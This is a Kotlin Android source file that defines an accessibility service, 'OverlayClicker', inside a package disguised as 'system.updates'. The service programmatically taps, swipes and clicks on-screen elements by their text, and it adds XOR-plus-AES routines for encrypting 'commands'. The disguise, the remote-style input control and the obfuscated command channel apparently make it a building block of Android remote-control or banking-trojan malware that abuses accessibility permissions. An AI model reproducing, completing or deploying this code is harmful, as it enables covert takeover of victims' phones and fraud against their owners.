package com.system.updates.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Context
import android.graphics.Path
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.view.accessibility.AccessibilityEvent
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class OverlayClicker : AccessibilityService() {
    private val handler = Handler(Looper.getMainLooper())
    private val r = SecureRandom()
    private val mask = byteArrayOf(0x2E, 0x3F, 0x4A, 0x5B, 0x6C, 0x7D, 0x8E.toByte(), 0x9F.toByte())

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        // لا تفعل شيئاً هنا، نستخدم الخدمة فقط للـ Gestures
    }

    override fun onInterrupt() {}

    fun simulateTap(x: Float, y: Float): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false
        val path = Path()
        path.moveTo(x, y)
        val gestureBuilder = GestureDescription.Builder()
        gestureBuilder.addStroke(GestureDescription.StrokeDescription(path, 0, 100))
        return dispatchGesture(gestureBuilder.build(), null, null)
    }

    fun simulateSwipe(x1: Float, y1: Float, x2: Float, y2: Float): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false
        val path = Path()
        path.moveTo(x1, y1)
        path.lineTo(x2, y2)
        val gestureBuilder = GestureDescription.Builder()
        gestureBuilder.addStroke(GestureDescription.StrokeDescription(path, 0, 500))
        return dispatchGesture(gestureBuilder.build(), null, null)
    }

    fun clickOnViewByText(text: String): Boolean {
        val root = rootInActiveWindow ?: return false
        val nodes = mutableListOf<android.view.accessibility.AccessibilityNodeInfo>()
        val queue = ArrayDeque<android.view.accessibility.AccessibilityNodeInfo>()
        queue.add(root)
        while (queue.isNotEmpty()) {
            val current = queue.removeFirst()
            if (current.text?.toString()?.contains(text, true) == true) {
                nodes.add(current)
            }
            for (i in 0 until current.childCount) {
                current.getChild(i)?.let { queue.add(it) }
            }
        }
        return nodes.any { it.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK) }
    }

    // encryption utilities (for any data we might need to encrypt)
    private fun xor(data: ByteArray): ByteArray {
        return data.mapIndexed { i, b -> (b.toInt() xor mask[i % mask.size].toInt() xor i).toByte() }.toByteArray()
    }

    private fun aesEnc(data: ByteArray, key: ByteArray): ByteArray {
        val c = Cipher.getInstance("AES/GCM/NoPadding")
        val iv = ByteArray(12).also { r.nextBytes(it) }
        val ks = SecretKeySpec(key, "AES")
        c.init(Cipher.ENCRYPT_MODE, ks, GCMParameterSpec(128, iv))
        return iv + c.doFinal(data)
    }

    fun encryptCommand(cmd: String, key: ByteArray): String {
        val raw = cmd.toByteArray()
        val x = xor(raw)
        val enc = aesEnc(x, key)
        return Base64.encodeToString(enc, Base64.NO_WRAP)
    }
}